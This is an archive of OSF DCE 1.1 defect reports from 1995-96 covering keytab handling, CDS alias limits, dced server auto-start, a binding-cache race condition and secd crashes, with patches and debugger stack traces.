>  |               _____________________________________________
>  |
>  |
>  |
>  |       Name :  _________________________
>  |
>  |       Value:  _____________________________________________
>  |
>  |               _____________________________________________
>  |
>  |
>  |
>  |
>  |
>  |
>  |
>  +----------------------------------------------------------------------------+
>  
>  I can't input Description more than 91bytes in above mask..
> 
>  How can I input it? Please teach me! 
> 
> (p.s.) 
> Refering to GDS Admin.Guide and Refference Appendix C, Description(DSC)'s
> Upper
>  bound is 1024 bytes.
> 
> Some such long attributes exist too. For example, ARL,CRL,and so on. 
> 
> Thanks.
> 
> Chen
> ----------------------------------------------------------------------------
>   Fujitsu Limited, OPEN SOFTWARE DIVISION 5th DEVELOPMENT DEPT.
>   Chen, Xiao-liang (CEC)
>   TEL:+81-45-474-1926
>   FAX:+81-45-473-3709
>   E-mail Address: chen@ssaws.yk.fujitsu.co.jp
>   NIFTY-Serve ID: KYL00167
> ----------------------------------------------------------------------------
>



CR Number                     : 12966
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : The sec_key_mgmt_set_key() and sec_key_mgmt_delete_key() call do not work with the FILE prefix appended to keytab name.
Reported Date                 : 7/23/95
Found in Baseline             : 1.1b24
Found Date                    : 7/23/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/23/95 public]

The routines sec_key_mgmt_delete_key() and sec_key_mgmt_set_key() do
not handle the argument for the keytab file if it is prepended with 
the FILE prefix.  This is the procedure specified in the documentation.
However, if the file is entered without the prefix the operations are
successful.  

The reason for this is that the operations table loaded with the FILE
prefix excludes the "add" and "delete" function pointers.  However, if
the file is left unprefixed the "WRFILE" prefix is automatically
preappended to the file name, resulting in the loading of the complete
set of keytab file operation pointers.

We are not sure of the reason for this mechanism.  It seems that for
readonly operations the FILE prefix is needed, whereas for the update
operations no prefix is necessary. 

If this is the way it should work then the documentation should be 
modified to reflect the proper behavior, otherwise the code needs
to be changed to maintain consistency in the naming of the keytab
files in the APIs.

[8/1/95 public]

does anyone care to comment on this defect at HP?  We
are wondering what you all think the proper way to fix this
is?



CR Number                     : 12963
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : cdsalias create fails with 234 characters
Reported Date                 : 7/20/95
Found in Baseline             : 1.1
Found Date                    : 5/25/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/20/95 public]

The 4/94 hierarchical cells spec from DEC says, "assure that the new alias
name is less than 255 characters long," which implies the maximum name
is 254 characters.  Cdsalias create fails with a name which is 234 or more
characters.  /.../ is being counted as 5 of the characters supplied.  The
cellname is cellkrisw1, so even with that added it would be less than 254
characters.  The error is, "The supplied cellname is required to be < 255
bytes in length."

(ibm - see defect 14030.)

[2/7/96 public]

Forwarding this from dcecp to cds.  In the dcecp code, the alias name
provided by the user (and its length) are stored in

      alias_name.fn_name
      alias_name.fn_length

As stated above, using an alias name of >= 234 characters causes dcecp
to fail unexpectedly, but the error comes from CDS.

In the code, with the 'alias_name' structure created properly, the call

      rpc_status = cp_AddCellname(..., &command_status);

has the return values rpc_status = 0 and command_status = 282109022.

The failed 'command_status' is passed up through dcecp and you get

      dcecp> cdsalias create /.../long-name-with-more-than-234-characters...
      Error: The supplied cellname is required to be < 255 bytes in length.
      dcecp>

dcecp is doing the right thing by passing along the error message.



CR Number                     : 12962
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : cdsalias create, delete need errors for exists/does not exist
Reported Date                 : 7/20/95
Found in Baseline             : 1.1
Found Date                    : 5/25/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/20/95 public]
it appeared to fail.  RFC 42.3 said there would be an error returned by 
cdsalias create if the name already existed and an error returned by cdsalias
delete if a name did not exist.  Neither error occurs; in fact cdsalias
create will create an alias if another entity exists with the same name, such
as /.:/hosts.  This behavior from these commands can be confusing and 
misleading to users.  The same name used for different things can create
problems; also if a user types a name incorrectly, delete appears to succeed
and does not bring to his attention that the alias did not exist.  

(ibm - see defects 14028 and14029.)

[2/7/96 public]

The following dcecp commands illustrate this problem well:

      dcecp> cdsalias catalog
      {CDS_CellAliases
       {Primary /.../mgm_test_config}
       {Alias /.../set_alias}}
      dcecp>
      dcecp>
      dcecp> cdsalias delete /.../gumby
      dcecp>
      dcecp> cdsalias catalog
      {CDS_CellAliases
       {Primary /.../mgm_test_config}
       {Alias /.../set_alias}}
      dcecp>

The point being a delete of non-existant alias '/.../gumby' did
not return an expected error message, rather a status of success.

The internal call

      rpc_status = cp_RemoveCellname(..., &command_status);

returns rpc_status = 0 and command_status = 282107905, which
is CDS_SUCCESS.  dcecp has no way of knowing to report an error
in this case.



CR Number                     : 12960
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12854
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : server
Short Description             : code is incomplete
Reported Date                 : 7/20/95
Found in Baseline             : 1.1
Found Date                    : 7/20/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/20/95 public]

According to the dced 'server' man page, dced is supposed to be able
to start servers automatically when an RPC to an interface managed
by the server arrives ('auto' in the 'starton' server configuration
attribute).  Code to pass the 'auto' attribute value exists in dcecp,
but dced does not do anything with it.
	This is related to OT 12854 ('server disable' doesn't work)
because both are concerned with the transition from the old endpoint
database to the new (in a way).  'server disable' updates the 'endpoint
valid' flag in the new database, but the endpoint mapper code uses the
old database, and thus the 'endpoint valid' flag is ignored; the 'auto'
code should presumably scan the endpoint map, find no match, and check
the server configuration list for a matching server.  Thus, both problems
are really problems with the endpoint mapper code not having been upgraded.
	I listed OT 12854 as priority 'C1' because the lack of the
'server disable' isn't particularly ugly; I perceive it as a relatively
minor feature.  But 'auto'-starting servers is a major feature, and one
on which some of our customers depend; and there is no indication elsewhere
that it is not meant to be supported in OSF DCE 1.1; hence I'm giving this OT
an "A1" priority.

[2/5/96 public]

I'm downgrading this since there are no current DCE dependencies on this 
functionality and its absence is not a fatal problem.



CR Number                     : 12956
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : sec_key_mgmt* KRB5_KT_NOWRITE
error if "FILE:" present
Reported Date                 : 7/18/95
Found in Baseline             : 1.1
Found Date                    : 7/18/95
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/18/95 public]

Documentation says the sec_key_mgmt* routines  will prepend 
the "FILE:" prefix to the key file parameter if it's not supplied, 
effectively making this prefix optional.  Routines such as 
sec_key_mgmt_manage_key() and sec_key_mgmt_get_next_kvno() work 
with or without the "FILE:" prefix.  

However, sec_key_mgmt_change_key() and sec_key_mgmt_set_key()
won't work with the "FILE:" prefix (on Digital UNIX/Alpha) and
report a KRB5_KT_NOWRITE error code.



CR Number                     : 12952
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : RCA
Short Description             : core dump in binding_cache_lookup().
Reported Date                 : 7/14/95
Found in Baseline             : 1.1
Found Date                    : 7/14/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/14/95 public]

we have seen DCE servers dump in binding_cache_lookup() (file security/client/rca/internal_binding.c).
binding_cache_lookup() assumes the context is not changing which is not correct.Some other thread which has the mutex for the context can be in the process
of rebinding (via rca_rebind) can cause the fileds (site_name in particular)
in the context to become null. binding_cache_lookup() does a strcmp() with this.This can be easily reproduced by running a test case which does sec. calls
from multiple threads and taking the secd down while it is running.
 
Turns out that locking the context mutex in binding_cache_lookup() 
will cause deadlocks as rca_site_bind() called from the client stub calls 
binding_cache_lookup() , but before the stub the same thread has locked 
the context. 
 
Any suggestions to fix this?.

[8/31/95 public]

Check out the fix in OT 13011 and tell us if that helps you.

[2/8/96 public]
The binding_cache_lookup() code has changed and the file 
security/client/rca/internal_binding.c has changed even more. I have lowered
the priority because binding code has been worked on in this release and this
may be fixed (from looking at the code). If not you can change the priority 
back up and provide more details like core dump stack trace etc... 
Mike, would you like to comment?


OK..Here are the details:

t@6 is the faulting thread
t@7 is rebinding.

[t@6 l@4]:w 
t@6
  [1] strcmp(), at 0xeefe27c8
=>[2] binding_cache_lookup(site_name = 0xee6f0f9f "/.../shasta.dce.transarc.com"
, auth_info = 0xee6f14d8, princ = 0xef6ef440 , cell = 0xee6f0b97 "/.../shasta.dc
e.transarc.com", context = 0xee6f0b8c), line 642 in "/afs/dfs.transarc.com/dept/
dce/dev/V1.1/12.043/src/security/client/rca/internal_binding.c"
  [4] rca_site_bind(site_name = 0xee6f0f9f "/.../shasta.dce.transarc.com", auth_
info = 0xee6f14d8, flags = 3, if_spec = (nil), princ = 0xef6ef440 , cell = (nil)
, context = 0xee6f1d18, status = 0xee6f1d14), line 2465 in "/afs/dfs.transarc.co
m/dept/dce/dev/V1.1/12.043/src/security/client/rca/internal_binding.c"
  [5] sec_rgy_site_bind(site_name = 0x21054 "", auth_info = 0xee6f14d8, context 
= 0xee6f1d18, status = 0xee6f1d14), line 187 in "/afs/dfs.transarc.com/dept/dce/
dev/V1.1/12.043/src/security/client/rca/binding.c"
  [6] sec_rgy_site_bind_query(site_name = 0x21054 "", auth_info = 0xee6f14d8, co
ntext = 0xee6f1d18, status = 0xee6f1d14), line 252 in "/afs/dfs.transarc.com/dep
t/dce/dev/V1.1/12.043/src/security/client/rca/binding.c"
  [7] do_func1(), line 52 in "c.c"
  [8] pthread_start(arg = 0x220f0), line 975 in "/afs/dfs.transarc.com/dept/dce/
dev/V1.1/12.043/src/sol_pth/pthread.c"
[t@6 l@4]: p cur->site_name 
cur->site_name = (nil)
[t@6 l@4]: list 638
638
639          if (site_name && site_name[0])
640          {
641              if ((u_strcmp (cur->site_name, site_name) != 0) &&
642                  (u_strcmp (cur->cell_name, site_name) != 0))
643              {
644                  SEC_DBG_PRINTF(3,("Site mismatch\n"));
645                  continue;
646              }
647          }
[t@6 l@4]:w t@7
t@7
  [1] _write(0x0, 0xb, 0x0, 0xee6f1e47, 0xff00, 0xff), at 0xeeff8650
  [2] write(0xee6cfa8c, 0x96790, 0xb5, 0x0, 0x0, 0x10d0a001), at 0xef1641a0
  [3] cds_send(Flags_p = 0xee6cfa8c, msg_p = 0x96790 ""), line 238 in "/afs/dfs.
transarc.com/dept/dce/dev/V1.1/12.043/src/directory/cds/library/dnssend.c"
  [4] cdsReadAttrValue(Name_p = 0xee6cf5dc, Handle_p = 0x97e08 "", AttrName_p = 
0xee6cf563, EntryType = cdsDirOrObj, Clearinghouse_p = 0xef7640fe, Value_pp = 0x
ee6cfa64, CTS_pp = (nil), AddrBuf_p = (nil), AddrBufLen_p = (nil), Flags_p = 0xe
e6cfa8c), line 138 in "/afs/dfs.transarc.com/dept/dce/dev/V1.1/12.043/src/direct
ory/cds/library/dnsreadattrvalue.c"
  [5] rpc__nsattr_read_resolution(nsentry = 0x21fa8, attr_type = 3, resolved_nam
e = 0xee6cff74 "", resolved_name_length = 0xee6cff6c, status = 0xee6cff64), line
 654 in "/afs/dfs.transarc.com/dept/dce/dev/V1.1/12.043/src/rpc/runtime/nsattr.c
"
  [6] rpc_ns_entry_inq_resolution(entry_name_syntax = 3, entry_name = 0x24308 "/
.../shasta.dce.transarc.com", resolved_name = 0x23fdc, unresolved_name = (nil), 
status = 0xee6d1d14), line 718 in "/afs/dfs.transarc.com/dept/dce/dev/V1.1/12.04
3/src/rpc/runtime/nsentry.c"
  [7] rca_site_bind_nsi(context = 0x23fc8, status = 0xee6d1d14), line 1835 in "/
afs/dfs.transarc.com/dept/dce/dev/V1.1/12.043/src/security/client/rca/internal_b
inding.c"
  [8] rca_nsi_binding_import(context = 0x23fc8, status = 0xee6d1d14), line 1205 
in "/afs/dfs.transarc.com/dept/dce/dev/V1.1/12.043/src/security/client/rca/inter
nal_binding.c"
  [9] rca_rebind(context = 0x23fc8, status = 0xee6d1d14), line 1596 in "/afs/dfs
.transarc.com/dept/dce/dev/V1.1/12.043/src/security/client/rca/internal_binding.
c"
  [10] rca_check_binding(context_p = 0xee6d07e4, which = 0, status = 0xee6d1d14)
, line 1743 in "/afs/dfs.transarc.com/dept/dce/dev/V1.1/12.043/src/security/clie
nt/rca/internal_binding.c"
  [11] rca_check_binding_resolved(context_p = 0xee6d07e4, which = 0, retry_count
 = 0xee6d07a8, status = 0xee6d1d14), line 1651 in "/afs/dfs.transarc.com/dept/dce/dev/V1.1/12.043/src/security/client/rca/internal_binding.c"
  [12] sec__id_parse_name(rcontext = 0x23fc8, domain = 0, global_name = 0x2105c 
"/.../shasta.dce.transarc.com/hosts/shasta/self", cell_namep = 0xee6d1913 "", ce
ll_idp = 0xee6d1900, princ_namep = 0xee6d14ff "", princ_idp = 0xee6d14ec, status
 = 0xee6d1d14), line 1361 in "/afs/dfs.transarc.com/dept/dce/dev/V1.1/12.043/src
/security/client/rca/secidmap.c"
  [13] sec_id_parse_name(rcontext = 0x23fc8, global_name = 0x2105c "/.../shasta.
dce.transarc.com/hosts/shasta/self", cell_namep = 0xee6d1913 "", cell_idp = 0xee
6d1900, princ_namep = 0xee6d14ff "", princ_idp = 0xee6d14ec, status = 0xee6d1d14
), line 1442 in "/afs/dfs.transarc.com/dept/dce/dev/V1.1/12.043/src/security/cli
ent/rca/secidmap.c"
  [14] do_func1(), line 57 in "c.c"
  [15] pthread_start(arg = 0x22138), line 975 in "/afs/dfs.transarc.com/dept/dce
/dev/V1.1/12.043/src/sol_pth/pthread.c"

[8/12/96 public]

  I was able to fix this problem by locking the cache_mutex in rca_check_binding
before calling rca_rebind().  This seems safe, and will stop 
binding_cache_lookup from examining contexts that are being updated by
rca_rebind.

  I have looked at the 1.2.1 code, and there still seem to be inconsistencies
between what mutexes need to be held during a particular operation.  It
would be nice if there were an explanation of the order these mutexes
should be obtained.  In particular, there are some functions that are exported
by this file that I think assume that the cache_mutex is locked when they
are called - the problem is that cache_mutex is static to the file and there
are no functions that are exported that would allow the mutex to be locked
by an external caller.

  internal_binding.c is a pretty confusing file.  For fun sit down and
draw a call graph of the functions in the file (it still makes me laugh
every time I look at it :).



CR Number                     : 12945
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : aud, sams
Short Description             : auditd usage message not in catalog
Reported Date                 : 7/6/95
Found in Baseline             : 1.1
Found Date                    : 7/6/95
Severity                      : D
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/6/95 public]

                          DCE Problem Report
                  =================================


Submitter Information (Include email address at miminum)
---------------------

Submitter Name:         Tom Jordahl
Organization:           Gradient Technologies
Email Address:          tomj@gradient.com
Phone:                  (508) 485-5235 x173
DCE License Number:     


Hardware/Software Configuration
- --------------------------------

Offering and Version:   DCE 1.1
Component (Module):     aud
Client Hardware:        x86
Client Software:        Unixware 2.0
Server Hardware:        SAME
Server Software:        SAME
Compiler:               Unixware cc

Problem Description
- --------------------

Severity Level: Minor

Date of First Occurrence: April 26, 1995

One Line Description:
auditd usage message not in message catalog

Full Description:

        The auditd usage message is specified 'undocumented' which
also means it doesn't get in the message table or catalog.

Repeat By:

        run auditd -x and see message not found error

Proposed Solution:

fix it in src/security/audit/libaudit/aud.sams:

***************
*** 135,141 ****
  action                "Give the trail file size limit (defined by the user) wi
th the \*L-s\*O option."
  end

! start           undocumented
  code          aud_s_dmn_usage
  sub-component         aud_s_general
  attributes    "svc_c_sev_fatal | svc_c_action_exit_bad"
--- 139,145 ----
  action                "Give the trail file size limit (defined by the user) wi
th the \*L-s\*O option."
  end

! start           intable incatalog undocumented
  code          aud_s_dmn_usage
  sub-component         aud_s_general
  attributes    "svc_c_sev_fatal | svc_c_action_exit_bad"



CR Number                     : 12944
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : krb5
Short Description             : portability issues in reading keytab files
Reported Date                 : 7/6/95
Found in Baseline             : 1.1
Found Date                    : 7/6/95
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/6/95 public]


                          DCE Problem Report
                  =================================


Submitter Information (Include Email address at miminum)
- ---------------------

Submitter Name:         Spike White
Organization:           HaL Software Systems
Email Address:          spike@hal.com
Phone:                  (512) 834-9964 x 5083
DCE License Number:     1352


Hardware/Software Configuration
- -------------------------------

Offering and Version:   DCE 1.1
Component (Module):     security
Client Hardware:        N/A 
Client Software:        N/A 
Server Hardware:        Sun 
Server Software:        Solaris 2.4 
Compiler:               SunSoft 2.0.1 

Problem Description
- -------------------

Severity Level: Severe 

Date of First Occurrence: 

One Line Description:

Our implementation found a portability problem in reading/writing keytab file. 
Full Description:

Fixed a "weakness" in  krb5_ktfileint_write_entry.  Namely, the "keytype"
field is written out as a krb5_ui_2, but read in (in krb5_ktfileint_read_entry)
as a krb5_keytype.  If the size of those types differ (as they did in our
implementation), you have problems.  The fix was to read and write the field
consistently as a krb5_keytype, whatever size that ends up being.


Repeat By:
   if sizeof(krb5_ui_2) != sizeof(krb5_keytype) for a given implementation,
   try to bring up secd and then CDS. The security server will not 
   authenticate cdsadv or cdsd with root credentials.  This is because cdsadv
   or cdsd reads the /krb5/v5srvtab key field incorrectly, so gives secd the
   wrong value for the key.  So the two keys don't match and the cds programs
   aren't authenticated.

Proposed Solution:
   Context diff is given below.

*** /net/wilma/ext/cvshome/apps/dce/sandbox/hal11_intl_sb/src/security/krb5/lib/keytab/file/ktf_util.c	Tue Dec  6 10:49:14 1994
--- ./ktf_util.c	Fri Sep 16 16:51:39 1994
***************
*** 8,23 ****
  /*
   * HISTORY
   * $Log:	c012944,v $
# Revision 1.1  95/07/06  22:45:27  root
# new CR
# 
-  * Revision 1.1  1994/12/06  16:49:14  spike
-  * @defects
-  *
-  * @comment
-  * Fixed a "weakness" in  krb5_ktfileint_write_entry.  Namely, the "keytype"
-  * field is written out as a krb5_ui_2, but read in (in krb5_ktfileint_read_entry)
-  * as a krb5_keytype.  If the size of those types differ (as they did in our
-  * implementation), you have problems.  The fix was to read and write the field
-  * consistently as a krb5_keytype, whatever size that ends up being.
-  *
   * Revision 1.1.9.2  1994/09/16  21:51:34  sommerfeld
   * 	[OT12036] Bug in ktfileint_delete_entry: doesn't byte swap length
   * 	enough places.
--- 8,13 ----
***************
*** 37,44 ****
  **
  */
  /*
!  * $Source: /project/ot/dce/d01/d29/RCS/c012944,v $
!  * $Author: root $
   *
   * Copyright (c) Hewlett-Packard Company 1991
   * Released to the Massachusetts Institute of Technology for inclusion
--- 27,34 ----
  **
  */
  /*
!  * $Source: /project/ot/dce/d01/d29/RCS/c012944,v $
!  * $Author: root $
   *
   * Copyright (c) Hewlett-Packard Company 1991
   * Released to the Massachusetts Institute of Technology for inclusion
***************
*** 109,115 ****
  
  #if !defined(lint) && !defined(SABER)
  static char rcsid_ktf_util_c[] =
! "$Id: c012944,v 1.1 95/07/06 22:45:27 root Exp $";
  #endif	/* !lint & !SABER */
  
  #include <krb5/krb5.h>
--- 99,105 ----
  
  #if !defined(lint) && !defined(SABER)
  static char rcsid_ktf_util_c[] =
! "$Id: c012944,v 1.1 95/07/06 22:45:27 root Exp $";
  #endif	/* !lint & !SABER */
  
  #include <krb5/krb5.h>
***************
*** 567,598 ****
  {
      krb5_data *princ;
      krb5_data **princp;
- #ifdef __haldce__ /* HaL@PORT-SOLARIS@19941212 SW */
-     /* 
-      * Name: Spike White (spike@hal.com)
-      * Reason:
-      *    In porting to Solaris, we had changed the size of
-      *    krb5_ui_2 from 2 bytes to 4 bytes.  This was to avoid
-      *    alignment errors (originally seen on SunOS w/ an earlier
-      *    version of the compiler).  But that exposed a weakness in
-      *    this code.  Namely, the krb5_ktfileint_write_entry writes the
-      *    "keytype" field out as a krb5_keytype (which is equivalent to a
-      *    krb5_ui_2 which is 32 bits in our implementation).  And
-      *    this routine reads it in as a krb5_int16, which is 16 bits.  That 
-      *    doesn't work.
-      * Approach:  Write the "keytype" field out as type krb5_keytype and read 
-      *    it in as the same type.  That way, whatever size this krb5_keytype 
-      *    type is in the future, the code still works.  And the comments at
-      *    the beginning of this file about the structure of a keytab file are 
-      *    still correct.
-      */
-     krb5_int16 count, size, size1; 
-     krb5_keytype keytype;
- #else
-     /* Original OSF code */
      krb5_int16 count, size, size1, keytype;
- #endif /* __haldce__ HaL@PORT-SOLARIS@19941212 SW */
- 
      krb5_error_code retval = 0;
      krb5_timestamp timestamp;
      krb5_int32	princ_type;
--- 557,563 ----
***************
*** 724,758 ****
      if (KTVERSION(id) == KRB5_KT_VNO_1)
  	    keytype = entry->key.keytype;
      else
- #ifdef __haldce__ /* HaL@PORT-SOLARIS@19941212 SW */
-     /* 
-      * Name: Spike White (spike@hal.com)
-      * Reason:
-      *    In porting to Solaris, we had changed the size of
-      *    krb5_ui_2 from 2 bytes to 4 bytes.  This was to avoid
-      *    alignment errors (originally seen on SunOS w/ an earlier
-      *    version of the compiler).  But that exposed a weakness in
-      *    this code.  Namely, the krb5_ktfileint_write_entry writes the
-      *    "keytype" field out as a krb5_keytype (which is equivalent to a
-      *    krb5_ui_2 which is 32 bits in our implementation).  And
-      *    this routine reads it in as a krb5_int16, which is 16 bits.  That 
-      *    doesn't work.
-      * Approach:  Write the "keytype" field out as type krb5_keytype and read 
-      *    it in as the same type.  That way, whatever size this krb5_keytype 
-      *    type is in the future, the code still works.  And the comments at
-      *    the beginning of this file about the structure of a keytab file are 
-      *    still correct.
-      */
- 	    switch (sizeof(keytype)) { 
- 	        case 2 : keytype = htons(entry->key.keytype);  break;
- 	        case 4 : keytype = htonl(entry->key.keytype);  break;
- 		default: goto abend;
-             }
- #else
- 	    /* Original OSF code */
  	    keytype = htons(entry->key.keytype);
- #endif /* __haldce__ HaL@PORT-SOLARIS@19941212 SW */
- 
      if (!xfwrite(&keytype, sizeof(keytype), 1, KTFILEP(id))) {
  	goto abend;
      }
--- 689,695 ----



CR Number                     : 12940
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : 
Short Description             : secd coredumps because authn_protocol == 255
Reported Date                 : 6/29/95
Found in Baseline             : 1.1
Found Date                    : 6/28/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/30/95 public]
We've had two occasions where secd has indexed through the
rpc_g_authn_protocol_idarray using a bad authn protocol (255 or 511).
I suspect the value is really -1 in disguise.  In both cases, the
bad authn protocol came from the auth_info.authn_protocol in an rpc
binding handle.  Both cases were making ncacn_ip_tcp RPCs.  At this
time the problem can not be reliably reproduced.

We're not certain of cause and effect, but the crashes seem to be
related to changing the security master in a cell.  Here's the chain
of events that caused the first crash (from one of our engineer's
notes):

    Some additional background information about how to reproduce this
    problem.
    I configured a secd on highline.
    I configured a security slave on testlab31.
    I designated the secd on testlab31 to be the master.
    I used dcesetup to configure a slave cds on testlab31.
    The script uses rgy_edit -update to create principals
    keytab files etc..
    >>>>>>This crashed the replica security server!!<<<<<<<<

The first occurrence was in rpc_auth_info_release, called from 
rpc__cn_assoc_sec_free, trying to access the free_info field of the
rpc_g_authn_protocol_id's epv vector.

From the first core:
 [1] 0x322e3220(0xedfd89dc, 0xef766fa4, 0xef75aea8, 0xb988, 0x1, 0x234d58), at \
0x322e321f
=>[2] rpc__auth_info_release(info = 0x276714), line 562 in "/afs/transarc.com/p\
roject/dce/V1.1/12.019/src/rpc/runtime/comauth.c"
 [3] rpc__cn_assoc_sec_free(sec = 0xedfd8aac), line 4096 in "/afs/transarc.com/\
project/dce/V1.1/12.019/src/rpc/runtime/cnassoc.c"
 [4] rpc__cn_assoc_acb_dealloc(assoc = 0x233928), line 4690 in "/afs/transarc.c\
om/project/dce/V1.1/12.019/src/rpc/runtime/cnassoc.c"
 [5] rpc__cn_network_receiver(assoc = 0x233928), line 515 in "/afs/transarc.com\
/project/dce/V1.1/12.019/src/rpc/runtime/cnrcvr.c"
 [6] pthread_start(arg = 0x235868), line 919 in "/afs/transarc.com/project/dce/\
V1.1/12.019/src/sol_pth/pthread.c"

The value of auth_info->authn_protocol:
auth_info->authn_protocol = 255

The second occurrence was in rpc__auth_rpc_prot_epv, called from
rpc__cn_call_start.  The configuration was the same as above (the
crashed security server had been restarted and had been running
overnight).  This crash occured while he was changing the epoch on
a CDS directory.

From the second core:

*binding_r->auth_info = {
    cache_link        = {
        next = 0x28caf8
        last = 0xef79eeec
    }
    refcount          = 2
    server_princ_name = 0x283c80 "dce-ptgt@highline.dce.transarc.com"
    authn_level       = 5
    authn_protocol    = 511      <----- This is the offending value
    authz_protocol    = 1
    is_server         = 0
    u                 = {
        auth_identity = 0x1
        s             = {
            privs = 0x1
            creds = (nil)
        }
    }
}

=>[1] rpc__auth_rpc_prot_epv(authn_prot_id = 511, rpc_prot_id = 0), line 375 in "/afs/transarc.com/project/dce/dev/sb/nydick/nydick2/sb4/src/rpc/runtime/comauth.c"
  [2] rpc__cn_call_start(binding_r = 0x2a2340, call_options = 0, ifspec_r = 0xef73ef1c, opnum = 3, transfer_syntax = 0xedfa1ce4, st = 0xedfa1c84), line 337 in "/afs/transarc.com/project/dce/dev/sb/nydick/nydick2/sb4/src/rpc/runtime/cncall.c"
  [3] rpc_call_start(binding_h = 0x2a2340, flags = 0, ifspec_h = 0xef73ef1c, opnum = 3, call_handle = 0xedfa1c78, xfer_syntax = 0xedfa1ce4, status = 0xedfa1c84), line 175 in "/afs/transarc.com/project/dce/dev/sb/nydick/nydick2/sb4/src/rpc/runtime/comcall.c"
  [4] op3_csr(handle = 0x2a2340, authn_svc = 1, authz_svc = 2, requested_privs = 0x26c70c, ptgt_req = 0x299848, ptgt_rep = 0xedfa1f68, granted_privs = 0xedfa1ec0, aux_attr_request = 0xedfa1d94, aux_attr_result = 0xedfa1d88, app_tkt_request = (nil), app_tkt_result = 0xedfa1d7c, status = 0xedfa28d8), line 1917 in "/afs/transarc.com/project/dce/dev/sb/nydick/nydick2/sb4/obj/sparc_sol24/security/utils/rpriv_cstub.c"
  [5] sec_priv_get_eptgt_internal(login_context = 0x26bea8, target_cell = 0xedfa212b "/.../highline.dce.transarc.com", authn_svc = 1, authz_svc = 2, recurse = 1, privs = (nil), stp = 0xedfa28d8), line 991 in "/afs/tr/proj/dce/V1.1/12.017/src/security/client/rca/priv.c"
  [6] sec_priv_get_eptgt_internal(login_context = 0x26bea8, target_cell = 0xedfa212b "/.../highline.dce.transarc.com", authn_svc = 1, authz_svc = 2, recurse = 0, privs = 0xedfa28d8, stp = 0x45586732), line 1205 in "/afs/tr/proj/dce/V1.1/12.017/src/security/client/rca/priv.c"
  [7] _dce_JpVAJVgvCx(security_context = 0x26bea8, target_cell = 0xedfa212b "/.../highline.dce.transarc.com", authn_svc = 1, authz_svc = 2, stp = 0xedfa28d8), line 307 in "/afs/tr/proj/dce/V1.1/12.017/src/security/client/login/sec_login_util.c"
  [8] get_auth_info_creds(creds = 0xedfa2594, status = 0xedfa28d8), line 236 in "/afs/transarc.com/project/dce/V1.1/12.019/src/security/server/rs/rs_rep_auth.c"
  [9] rs_rep_auth_get_auth_info(auth_info = 0xedfa275c, status = 0xedfa28d8), line 375 in "/afs/transarc.com/project/dce/V1.1/12.019/src/security/server/rs/rs_rep_auth.c"
  [10] rs_rep_mgr_get_info_and_creds(h = 0x2798c0, rep_info = 0xedfa28e0, rep_auth_info = 0xedfa28dc, st = 0xedfa28d8), line 225 in "/afs/transarc.com/project/dce/V1.1/12.019/src/security/server/rs/rs_repmgr.c"
  [11] op0_ssr(h = 0x2798c0, IDL_call_h = 0x2af978, IDL_elt_p = 0xedfa2cc0, IDL_drep_p = 0x2339a4, IDL_transfer_syntax_p = 0x2afb6c, IDL_mgr_epv = 0x19ebb0, IDL_status_p = 0xedfa2c9c), line 893 in "/afs/transarc.com/project/dce/V1.1/12.019/obj/sparc_sol24/security/server/rs/rs_repmgr_sstub.c"
